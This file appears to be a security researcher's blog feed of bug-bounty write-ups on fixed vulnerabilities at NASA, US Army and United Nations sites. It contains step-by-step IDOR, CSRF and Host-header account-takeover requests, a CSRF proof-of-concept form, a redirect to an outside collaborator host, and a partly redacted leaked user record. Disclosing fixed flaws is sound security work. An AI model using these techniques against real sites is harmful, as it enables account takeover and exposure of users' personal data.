@@ -1,0 +1,1160 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-GB"><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en-GB" /><updated>2024-08-26T03:15:22+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Prakhar0x01</title><subtitle>An Ordinary guy in the way to become Extra-Ordinary.</subtitle><author><name>Prakhar0x01</name></author><entry><title type="html">Account Takeovers &amp;amp; more : Hacking NASA</title><link href="http://localhost:4000/write-ups/2024/07/25/hacking-nasa/" rel="alternate" type="text/html" title="Account Takeovers &amp;amp; more : Hacking NASA" /><published>2024-07-25T00:00:00+05:30</published><updated>2024-07-25T00:00:00+05:30</updated><id>http://localhost:4000/write-ups/2024/07/25/hacking-nasa</id><content type="html" xml:base="http://localhost:4000/write-ups/2024/07/25/hacking-nasa/"><![CDATA[<blockquote>
+  <p>I received 3 letters of appreciation from NASA for finding multiple potential Security vulnerabilities in their systems. In this blog post, I’ll explain all the technical part and non-technical parts of it.</p>
+</blockquote>
+
+<h3 id="my-approach">My Approach?</h3>
+
+<p>1 - I decided to look for <a href="https://portswigger.net/web-security/access-control">Access Control</a>, <a href="https://portswigger.net/web-security/access-control/idor">IDOR’s</a>, <a href="https://portswigger.net/web-security/authentication">Authentication</a> Issues. So, for that, I need functional assets that have some functionalities that need to be broken.</p>
+
+<p>2 - Hence, I used very basic Google Dorks to find those assets, as a result found some of them.</p>
+
+<p>3 - As a result discovered &amp; reported several security vulnerabilities to NASA (P1,P2,P3,P4).</p>
+
+<h3 id="1---idor-leads-to-0-click-account-takeover">1 - IDOR leads to 0-Click Account Takeover</h3>
+<blockquote>
+  <p><code style="color:red;"><b>P1</b></code> : <code style="color:Green;"><b>Resolved</b></code></p>
+</blockquote>
+
+<ul>
+  <li>Discovered that the Email Change functionality at <code class="language-plaintext highlighter-rouge">█████.pps.eosdis.nasa.gov</code> is vulnerable to IDOR.</li>
+  <li>Yeah, so now it was pretty much very simple to change your email to some other existing user email.</li>
+  <li>Create to account, <code class="language-plaintext highlighter-rouge">Account-A</code>(attacker) &amp; <code class="language-plaintext highlighter-rouge">Account-B</code>(victim)</li>
+  <li>Go to <code class="language-plaintext highlighter-rouge">Account A</code>, Change the email, and Intercept the request.</li>
+</ul>
+
+<h5 id="request">Request</h5>
+
+<div class="language-r highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">registration</span><span class="o">/</span><span class="n">updateEmailRequest.html</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="m">1.1</span><span class="w">
+</span><span class="n">Host</span><span class="o">:</span><span class="w"> </span><span class="err">█████</span><span class="n">.pps.eosdis.nasa.gov</span><span class="w">
+</span><span class="n">Cookie</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="n">your</span><span class="o">-</span><span class="n">cookie</span><span class="p">};</span><span class="w">
+</span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="o">:</span><span class="w"> </span><span class="m">89</span><span class="w">
+</span><span class="n">...snip...</span><span class="w">
+</span><span class="n">Connection</span><span class="o">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+
+</span><span class="n">oldEmail</span><span class="o">=</span><span class="n">attacker</span><span class="o">%40email.com&amp;email=test%</span><span class="m">40</span><span class="n">email.com</span><span class="o">&amp;</span><span class="n">confirmEmail</span><span class="o">=</span><span class="n">test</span><span class="o">%</span><span class="m">40</span><span class="n">email.com</span><span class="w">
+</span></code></pre></div></div>
+<ul>
+  <li>Change the <code class="language-plaintext highlighter-rouge">Old_email</code> parameter to <code class="language-plaintext highlighter-rouge">Account-B</code>(victim) email
+    <div class="language-r highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">oldEmail</span><span class="o">=</span><span class="n">victim</span><span class="o">%40email.com&amp;email=test%</span><span class="m">40</span><span class="n">email.com</span><span class="o">&amp;</span><span class="n">confirmEmail</span><span class="o">=</span><span class="n">test</span><span class="o">%</span><span class="m">40</span><span class="n">email.com</span><span class="w">
+</span></code></pre></div>    </div>
+  </li>
+  <li>Observe that the application changed the email of <code class="language-plaintext highlighter-rouge">Account B</code>(victim)</li>
+</ul>
+
+<h3 id="host-header-injection">Host Header Injection</h3>
+<blockquote>
+  <p><code style="color:red;"><b>P2</b></code> : <code style="color:Green;"><b>Resolved</b></code></p>
+</blockquote>
+
+<ul>
+  <li>Discovered a Host Header Injection on the Email Verification feature.</li>
+  <li>Register on <code class="language-plaintext highlighter-rouge">█████.pps.eosdis.nasa.gov</code> &amp; Click on <code class="language-plaintext highlighter-rouge">Verify Email</code>.</li>
+  <li>Intercept the Request, Change the</li>
+</ul>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Host: █████.pps.eosdis.nasa.gov</code></strong> with <strong><code class="language-plaintext highlighter-rouge">Host: your-collaborator-id.oastify.com</code></strong></p>
+
+<p>You’ll receive the verification link in your email as:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://yourburpcollaborator-is.oastify.com/registration/verifyContact/verification-token/attacker@email.com.html
+</code></pre></div></div>
+<ul>
+  <li>As an attacker, I could verify an account with any user email (belonging to individuals who do not intend to have an account on this web app) such as <strong><code class="language-plaintext highlighter-rouge">@nasa.gov</code></strong>.</li>
+</ul>
+
+<h3 id="csrf-leads-to-1-click-account-takeover">CSRF leads to 1-Click Account Takeover</h3>
+<blockquote>
+  <p><code style="color:orange;"><b>P3</b></code> : <code style="color:Green;"><b>Resolved</b></code></p>
+</blockquote>
+
+<ul>
+  <li>This is another report regarding the same endpoint(case-1), which is the Change Email function. Previously, I discovered the IDOR on the same endpoint. In this report, I found that an attacker can perform a CSRF Attack on the Email Change functionality, allowing them to take over any user’s account.</li>
+  <li>Login █████.pps.eosdis.nasa.gov &amp; Navigate to <code class="language-plaintext highlighter-rouge">Update Info</code> Page. Enable an HTTP interception proxy, such as Burp Suite.</li>
+  <li>Change the email and Intercept the request. Generate the CSRF PoC.</li>
+</ul>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+  <span class="c">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
+  <span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;script&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nf">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
+    <span class="nt">&lt;h1&gt;</span>MAGIC HAPPENS, IF YOU CLICK THE BELOW BUTTON..!!<span class="nt">&lt;/h1&gt;</span>
+    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://█████.pps.eosdis.nasa.gov/registration/updateEmailRequest.html"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"oldEmail"</span> <span class="na">value=</span><span class="s">"victim&amp;#64;email&amp;#46;com"</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"hacked&amp;#64;email&amp;#46;com"</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"confirmEmail"</span> <span class="na">value=</span><span class="s">"hacked&amp;#64;email&amp;#46;email"</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+  <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+<ul>
+  <li>Test it in the browser. The email will change &amp; the verification goes to the attacker-controlled email.</li>
+</ul>
+
+<h3 id="no-rate-limit-on-forget-password">No Rate Limit on Forget-Password</h3>
+<blockquote>
+  <p><code style="color:green;"><b>P4</b></code> : <code style="color:Green;"><b>Resolved</b></code></p>
+</blockquote>
+
+<ul>
+  <li>Lack of rate limiting on an email triggering endpoint (forget-password) was identified. This allows an attacker to create a large amount of emails to any email address, which they could use to spam a target with emails.</li>
+  <li>Navigate to <code class="language-plaintext highlighter-rouge">█████.hec.nasa.gov/account/recover/pwd</code> , enter the email then click <code class="language-plaintext highlighter-rouge">Reset Password</code></li>
+  <li>Intercept this request in the burp suite, the HTTP request looks like</li>
+</ul>
+
+<div class="language-r highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">rms</span><span class="o">/</span><span class="n">apis</span><span class="o">/</span><span class="n">public</span><span class="o">/</span><span class="n">account</span><span class="o">/</span><span class="n">recover</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="m">1.1</span><span class="w">
+</span><span class="n">Host</span><span class="o">:</span><span class="w"> </span><span class="err">█████</span><span class="n">.hec.nasa.gov</span><span class="w">
+</span><span class="n">Cookie</span><span class="o">:</span><span class="w"> </span><span class="n">YOUR_SESSION_COOKIES</span><span class="w">
+</span><span class="n">...snip...</span><span class="w">
+</span><span class="n">Connection</span><span class="o">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+
+</span><span class="p">{</span><span class="w">
+    </span><span class="s2">"username"</span><span class="o">:</span><span class="s2">"victim_user"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"email"</span><span class="o">:</span><span class="s2">"victim@email.com"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Send it to the <code class="language-plaintext highlighter-rouge">Intruder</code> and Under the <code class="language-plaintext highlighter-rouge">Payload Section</code> choose <code class="language-plaintext highlighter-rouge">payload as null</code> payloads and generate <code class="language-plaintext highlighter-rouge">50</code> payloads</p>
+  </li>
+  <li>You will receive <code class="language-plaintext highlighter-rouge">200 OK</code> in response, you can also check your mail inbox.</li>
+  <li>Systems that use Software-as-a-Service (SaaS) email providers, there can be direct financial costs associated with sending large volumes of email. Triggers emails can result in reputational damage for the organization as user’s trust is impacted through receiving large amounts of unwanted and unsolicited emails.</li>
+</ul>
+
+<h3 id="conclusion">Conclusion</h3>
+<p>It took me about 30 min to find these vulnerabilities in one asset. I didn’t perform so much recon, automation ..etc. Just picked up one asset from Google dorks &amp; Started hacking on it. And the vulnerabilities are pretty much very simple &amp; straightforward.</p>
+
+<h4 id="timeline">Timeline</h4>
+<ul>
+  <li>Reported -&gt; 03/July/2024</li>
+  <li>Triaged -&gt; 04/July/2024</li>
+  <li>Resolved -&gt; 25/July/2024</li>
+  <li>Received letter of Appreciation -&gt; 29/July/2024</li>
+</ul>
+
+<p><img src="/assets/logos/nasa.jpg" alt="loa_nasa" width="1000" height="auto" /></p>]]></content><author><name>Prakhar0x01</name></author><category term="write-ups" /><summary type="html"><![CDATA[My experience of finding multiple security vulnerabilities in the NASA Systems. In this blog post, I’ll explain all the technical part and non-technical parts of it.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://picsum.photos/2560/600?image=733" /><media:content medium="image" url="https://picsum.photos/2560/600?image=733" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">The tale of IDOR’s : Hacking US Dept. Of Defence</title><link href="http://localhost:4000/write-ups/2024/07/19/hacking-dod/" rel="alternate" type="text/html" title="The tale of IDOR’s : Hacking US Dept. Of Defence" /><published>2024-07-19T00:00:00+05:30</published><updated>2024-07-19T00:00:00+05:30</updated><id>http://localhost:4000/write-ups/2024/07/19/hacking-dod</id><content type="html" xml:base="http://localhost:4000/write-ups/2024/07/19/hacking-dod/"><![CDATA[<blockquote>
+  <p>I get acknowledged &amp; appreciated by US Department Of Defence for finding multiple Security vulnerabilities in the US amry systems i..e <code class="language-plaintext highlighter-rouge">█████.army.mil</code>. In this blog post, I’ll explain all the technical part and non-technical parts of it.</p>
+</blockquote>
+
+<ul>
+  <li>If you want to read original Reports :
+    <ol>
+      <li><a href="https://hackerone.com/reports/2586616"><strong>#2586616</strong> : Restrict any user from Login to their account</a></li>
+      <li><a href="https://hackerone.com/reports/2586662"><strong>#2586662</strong> : IDOR leads to Modify any user Biographical Details</a></li>
+      <li><a href="https://hackerone.com/reports/2587953"><strong>#2587953</strong> : Email Takeover leads to Permanent Account Deletion</a></li>
+      <li><a href="https://hackerone.com/reports/2586641"><strong>#2586641</strong> : IDOR leads to view any user Biographical Details</a></li>
+      <li><a href="https://hackerone.com/reports/2586584"><strong>#2586584</strong> : IDOR leads to PII Leak</a></li>
+    </ol>
+  </li>
+</ul>
+
+<h3 id="my-initial-approach">My Initial Approach?</h3>
+
+<p>1 - At first, I picked up any one asset from the <a href="https://github.com/KingOfBugbounty/KingRecon_DOD">GitHub scope</a> list and started hacking on it.</p>
+
+<p>2 - But after a couple of minutes, I realized this is not my thing, I feel like wasting my time in filtering assets &amp; running automated tools for subdomain enumeration.</p>
+
+<p>3 - Hence, I decided to look for <a href="https://portswigger.net/web-security/access-control">Access Control</a>, <a href="https://portswigger.net/web-security/access-control/idor">IDOR’s</a>, <a href="https://portswigger.net/web-security/authentication">Authentication</a> Issues. So, for that, I need functional assets that have some functionalities that need to be broken.</p>
+
+<p>4 - Hence, I used simple google dorks as <code style="color:red;">Site: *.army.mil "register" | "sign up" | "login"</code>. I have some interesting assets, but most are restricted only to federal staff.</p>
+
+<p>5 - One is available for normal users like it was based on internships or contract-based serving in the US Army. Like as a normal user, I could apply in that portal by registering myself &amp; submitting my application.</p>
+
+<h3 id="1---idor-leads-to-view-any-user-biographical-details"><a href="https://hackerone.com/reports/2586641">1 - IDOR leads to view any user Biographical Details</a></h3>
+<ul>
+  <li>
+    <p>Before submitting your application, you have to complete your profile in which your biographical details are also included. The user’s Identification is based on Numeric IDs (eg. <code class="language-plaintext highlighter-rouge">121312</code>).</p>
+  </li>
+  <li>
+    <p>Yeah, so now it was pretty much very simple to change your user-id to someone else user-id.</p>
+  </li>
+</ul>
+
+<p><img src="/assets/logos/idor1.png" alt="ssrf" width="1000" height="auto" /></p>
+
+<h3 id="2---idor-leads-to-modify-any-user-biographical-details"><a href="https://hackerone.com/reports/2586662">2 - IDOR leads to modify any user Biographical Details</a></h3>
+<ul>
+  <li>On the same endpoint (as above), there is a feature to update your biographical details. It was also based on numeric user IDs. so yes it also became very easy for me to exploit it.</li>
+</ul>
+
+<h5 id="vulnerable-request">Vulnerable Request</h5>
+
+<div class="language-r highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">JOINOnline</span><span class="o">/</span><span class="n">Board</span><span class="o">/</span><span class="n">SubmitDoc</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="m">1.1</span><span class="w">
+</span><span class="n">Host</span><span class="o">:</span><span class="w"> </span><span class="n">www.</span><span class="err">█████</span><span class="n">.army.mil</span><span class="w">
+</span><span class="n">Cookie</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="n">YOUR</span><span class="o">-</span><span class="n">COOKIES</span><span class="p">}</span><span class="w">
+</span><span class="n">...snip...</span><span class="w">
+</span><span class="n">Connection</span><span class="o">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+
+</span><span class="o">------</span><span class="n">WebKitFormBoundaryrQSrSuOi1l18BB2E</span><span class="w">
+</span><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="o">:</span><span class="w"> </span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s2">"UserId"</span><span class="w">
+</span><span class="m">268</span><span class="w">
+</span><span class="o">------</span><span class="n">WebKitFormBoundaryrQSrSuOi1l18BB2E</span><span class="w">
+</span><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="o">:</span><span class="w"> </span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s2">"Id"</span><span class="w">
+</span><span class="m">1328</span><span class="w">
+</span><span class="o">------</span><span class="n">WebKitFormBoundaryrQSrSuOi1l18BB2E</span><span class="w">
+</span><span class="n">...snip...</span><span class="w">
+</span><span class="n">Male</span><span class="w">
+</span><span class="o">------</span><span class="n">WebKitFormBoundaryrQSrSuOi1l18BB2E</span><span class="w">
+</span><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="o">:</span><span class="w"> </span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s2">"__RequestVerificationToken"</span><span class="w">
+</span><span class="p">{</span><span class="n">VERIFICATION</span><span class="o">-</span><span class="n">TOKEN</span><span class="p">}</span><span class="w">
+</span><span class="o">------</span><span class="n">WebKitFormBoundaryrQSrSuOi1l18BB2E</span><span class="o">--</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Yeah, so it was pretty much very simple to change your Doc-id (<code class="language-plaintext highlighter-rouge">1328</code>) to someone else doc-id &amp; change other user’s details.</li>
+</ul>
+
+<h3 id="3---idor-leads-to-pii-leak"><a href="https://hackerone.com/reports/2586584">3 - IDOR leads to PII Leak</a></h3>
+<ul>
+  <li>This vulnerability happened in the Update Account section. In this section, there is no sensitive information other than email.</li>
+</ul>
+
+<p><img src="/assets/logos/idor2.png" alt="ssrf" width="1000" height="auto" /></p>
+
+<h3 id="4---restrict-any-user-from-login-to-their-account"><a href="https://hackerone.com/reports/2586616">4 - Restrict any user from Login to their account</a></h3>
+<ul>
+  <li>
+    <p>I found this vulnerability in the Update Account section. There is no verification when changing the email.</p>
+  </li>
+  <li>
+    <p>so I can change my email to one that belongs to another user already registered on the portal. This would prevent that user from logging in and their account would be suspended.</p>
+  </li>
+</ul>
+
+<h3 id="5---email-takeover-leads-to-permanent-account-deletion"><a href="https://hackerone.com/reports/2587953">5 - Email Takeover leads to Permanent Account Deletion</a></h3>
+<ul>
+  <li>So after all the above findings, I’m looking for some more attack surface. Hence decided to look into web archives.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://web.archive.org/cdx/search/cdx?url=█████.army.mil&amp;fl=original&amp;collapse=urlkey
+</code></pre></div></div>
+
+<ul>
+  <li>Eventually, discover a hidden portal :</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.█████.army.mil/852████3EBO25/CreateAccount.html
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Now the process is pretty much the same as above (Case-4). The only difference is that once I take over any user email. Now that the user account is no more &amp; either the account is deleted permanently or the account information(including password) is changed to my(attacker’s) information.</p>
+  </li>
+  <li>
+    <p>Hence, I just created two accounts &amp; perform the necessary steps to exploit the vulnerability.</p>
+  </li>
+</ul>
+
+<h3 id="conclusion">Conclusion</h3>
+<p>It took me about 2 hrs to find 7 vulnerabilities in one asset. I didn’t perform so much recon, automation ..etc. Just picked up one asset from Google Dorks &amp; Started hacking on it. And the vulnerabilities are pretty much very simple &amp; straightforward.</p>
+
+<blockquote>
+  <p>“Sometimes you don’t need to be very smart, just try simple things”.</p>
+</blockquote>
+
+<h4 id="timeline">Timeline</h4>
+<ul>
+  <li>Reported -&gt; 06/July/2024</li>
+  <li>Triaged &amp; Appreciated -&gt; 06/July/2024 - 07/July/2024</li>
+  <li>Resolved -&gt; 12/July/2024 - 18/July/2024</li>
+</ul>]]></content><author><name>Prakhar0x01</name></author><category term="write-ups" /><summary type="html"><![CDATA[My experience of finding multiple IDOR's vulnerabilities in the US Army Systems sub-unit of US Dept. Of Defence. In this blog post, i’ll explain all the technical part and non-technical parts of it.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://picsum.photos/2560/600?image=733" /><media:content medium="image" url="https://picsum.photos/2560/600?image=733" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">1 Million users PII Leak : Hacking United Nations</title><link href="http://localhost:4000/write-ups/2024/07/15/united-nations/" rel="alternate" type="text/html" title="1 Million users PII Leak : Hacking United Nations" /><published>2024-07-15T00:00:00+05:30</published><updated>2024-07-15T00:00:00+05:30</updated><id>http://localhost:4000/write-ups/2024/07/15/united-nations</id><content type="html" xml:base="http://localhost:4000/write-ups/2024/07/15/united-nations/"><![CDATA[<blockquote>
+  <p>My Experience of hacking into United Nations &amp; finding a critical API misconfiguration in their systems which could lead to leak over 1 Million users PII. In this blog post, I’ll explain all the technical part and non-technical parts of it.</p>
+</blockquote>
+
+<ul>
+  <li>Yeah, So I found two major PII leaks in the United Nations system, 1st Leak(38,000+ users) is dicovered &amp; reported by another researcher &amp; the 2nd leak(1 Million+ users) is discovered &amp; reported by me.</li>
+</ul>
+
+<h3 id="my-approach">My Approach?</h3>
+
+<p>1 - So, as you might know, I don’t put so much time in recon &amp; all of that stuff. Hence In this case I did the same.</p>
+
+<p>2 - Hence, I tried very basic google dorks to discover some functional assets &amp; eventually found some of them.</p>
+
+<p>3 - My Burp was running in the background, I authorized my self to the application &amp; started testing various functionalities.</p>
+
+<p>4 - The application is responsible for organizing events in the united nations. So there are various functionalities to test.</p>
+
+<p>5 - Found an API endpoint, where it loads the user data via numeric user-id. changing my user-id to someone else user-id will result in information disclosure.</p>
+
+<h3 id="how-i-discovered-pii-leak">How I discovered PII leak.</h3>
+
+<ul>
+  <li>There is <strong>favourites</strong> section, where users can add what ever they like. When visiting the favorite section <strong><code class="language-plaintext highlighter-rouge">/user/favourite</code></strong></li>
+  <li>It loads an API endpoint the background i..e <strong><code class="language-plaintext highlighter-rouge">/api/principals</code></strong>, lacks proper access controls, leading to the disclosure of users PII. When accessed with any other valid user ID, the endpoint returns detailed user data, including email addresses, without requiring authentication or authorization.
+    <h5 id="request">Request</h5>
+  </li>
+</ul>
+
+<div class="language-r highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">principals</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="m">1.1</span><span class="w">
+</span><span class="n">Host</span><span class="o">:</span><span class="w"> </span><span class="err">█████</span><span class="n">.un.org</span><span class="w">
+</span><span class="n">...snip...</span><span class="w">
+</span><span class="n">Connection</span><span class="o">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+
+</span><span class="p">{</span><span class="w">
+    </span><span class="s2">"values"</span><span class="o">:</span><span class="p">[</span><span class="w">
+        </span><span class="s2">"User:{USER-ID}"</span><span class="w">
+        </span><span class="p">]</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h5 id="response">Response</h5>
+
+<div class="language-r highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HTTP</span><span class="o">/</span><span class="m">1.1</span><span class="w"> </span><span class="m">200</span><span class="w"> </span><span class="n">OK</span><span class="w">
+</span><span class="n">Server</span><span class="o">:</span><span class="w"> </span><span class="n">nginx</span><span class="o">/</span><span class="m">1.20.1</span><span class="w">
+</span><span class="n">...snip...</span><span class="w">
+</span><span class="n">Connection</span><span class="o">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+
+</span><span class="p">{</span><span class="w">
+    </span><span class="s2">"User:1459327"</span><span class="o">:</span><span class="p">{</span><span class="w">
+        </span><span class="s2">"affiliation"</span><span class="o">:</span><span class="s2">"Jele█████"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"affiliation_id"</span><span class="o">:</span><span class="n">null</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"affiliation_meta"</span><span class="o">:</span><span class="n">null</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"avatar_url"</span><span class="o">:</span><span class="s2">"/user/{user-id}/avatar-hash}"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"detail"</span><span class="o">:</span><span class="s2">"jele█████31@gmail.com (Jele█████)"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"email"</span><span class="o">:</span><span class="s2">"jele█████31@gmail.com"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"first_name"</span><span class="o">:</span><span class="s2">"Jele█████"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"identifier"</span><span class="o">:</span><span class="s2">"User:1459327"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"invalid"</span><span class="o">:</span><span class="n">false</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"last_name"</span><span class="o">:</span><span class="s2">"█████████"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"name"</span><span class="o">:</span><span class="s2">"Jele█████ ██████████"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"title"</span><span class="o">:</span><span class="s2">"none"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"type"</span><span class="o">:</span><span class="s2">"user"</span><span class="p">,</span><span class="w">
+        </span><span class="s2">"user_id"</span><span class="o">:</span><span class="m">1459327</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="impact">Impact</h3>
+
+<ul>
+  <li>PII Exposure: More than 1 Million users PII, including email addresses, are exposed to unauthorized access.</li>
+  <li>Privacy Violation: Users privacy is compromised, potentially leading to identity theft, phishing attacks, and other malicious activities.</li>
+  <li>Compliance Risks: This vulnerability may violate data protection regulations such as GDPR, CCPA, and others, resulting in legal consequences and financial penalties for the organization.</li>
+</ul>
+
+<h3 id="conclusion">Conclusion</h3>
+<ul>
+  <li>It took me about 20 minutes to find this critical API miconfiguration. I didn’t perform so much recon, automation ..etc. Just picked-up one asset from google dorks &amp; Start hacking on it.</li>
+  <li>If you’re just starting out in hacking, try to find vulnerabilites in governments systems, they are much vulnerable than you think.</li>
+</ul>
+
+<h4 id="timeline">Timeline</h4>
+<ul>
+  <li>Reported -&gt; 15/July/2024</li>
+  <li>Fixed -&gt; 16/July/2024 &amp; they wanted to meet me in person on a call.</li>
+</ul>
+
+<p><img src="/assets/logos/first.png" alt="first_response" width="1000" height="auto" /></p>
+
+<ul>
+  <li>In personal Call with head of unit &amp; Letter Of Appreciation -&gt; 18/July/2024</li>
+</ul>
+
+<p><img src="/assets/logos/appr1.png" alt="first_response" width="400" height="auto" /></p>]]></content><author><name>Prakhar0x01</name></author><category term="write-ups" /><summary type="html"><![CDATA[My experience of finding a critical API miconfiguration in the United Nations system which could lead to leak over 1 Million users Personal Identifiable Information.. In this blog post, i’ll explain all the technical part and non-technical parts of it.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://picsum.photos/2560/600?image=733" /><media:content medium="image" url="https://picsum.photos/2560/600?image=733" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Not Giving-Up : Hacking Netherlands Government</title><link href="http://localhost:4000/write-ups/2024/03/27/hacking-dutch-government/" rel="alternate" type="text/html" title="Not Giving-Up : Hacking Netherlands Government" /><published>2024-03-27T00:00:00+05:30</published><updated>2024-03-27T00:00:00+05:30</updated><id>http://localhost:4000/write-ups/2024/03/27/hacking-dutch-government</id><content type="html" xml:base="http://localhost:4000/write-ups/2024/03/27/hacking-dutch-government/"><![CDATA[<blockquote>
+  <p>I get rewarded “Dutch Government T-Shirt” for my contribution to their security infrastructure. I’ll explain all the technical part and non-technical parts of it. But before that, I want to tell you why am I proud of it or why the title of this post is “NOT GIVING-UP”.</p>
+</blockquote>
+
+<h3 id="why-so-much-proud">Why so much Proud?</h3>
+<ul>
+  <li>Well, there are mainly 2 reasons for it.</li>
+</ul>
+
+<ol>
+  <li>
+    <p>This is my small aim in 2022 to hack into any government, so I chose the Netherlands government (cuz they offer this cool T-Shirt), but I was even not able to make it in 2023, and finally made it possible in Feb-2024.</p>
+  </li>
+  <li>
+    <p>I reported around 11 reports to the Netherlands government and 10 of them closed. So it became very challenging.</p>
+  </li>
+</ol>
+
+<p><img src="/assets/logos/ncsc.jpeg" alt="ncsc" width="1000" height="auto" /></p>
+
+<ul>
+  <li>Now, Let’s come to the technical part of it ..e what was the Vulnerability, what was my approach ..etc</li>
+</ul>
+
+<h3 id="what-was-my-mindset">What was my Mindset?</h3>
+<ul>
+  <li>
+    <p>For the first 4–5 reports, I was totally based on recon, there is no such manual hacking over there. It mainly included subdomain brute-forcing, directory brute-forcing, and exposure of secrets.</p>
+  </li>
+  <li>1st report → <code class="language-plaintext highlighter-rouge">phpinfo.php</code> disclosure. (includes server versions and system internal paths) → Closed as “N/A” (Dec-2022)</li>
+  <li>2nd report → <code class="language-plaintext highlighter-rouge">Cross Site Scripting</code> → non-authentication application.(simple blog webpage). (Jan-2023)</li>
+  <li>3rd report → <code class="language-plaintext highlighter-rouge">Blind SQL Injection</code> → Not the part of Netherlands government.(Feb-2023)</li>
+  <li>4th report → <code class="language-plaintext highlighter-rouge">Username Enumeration</code> → Duplicate (Apr-2023)</li>
+  <li>5th report → <code class="language-plaintext highlighter-rouge">Server Security Misconfigurations</code> → Closed as N/A. (July-2023)</li>
+</ul>
+
+<p>This continues, So in December 2023, when I recovered from my mental health issues(lacking interest &amp; motivation in everything) and came back to hacking, I decided again to hack on the Netherlands government through manual hacking only.</p>
+
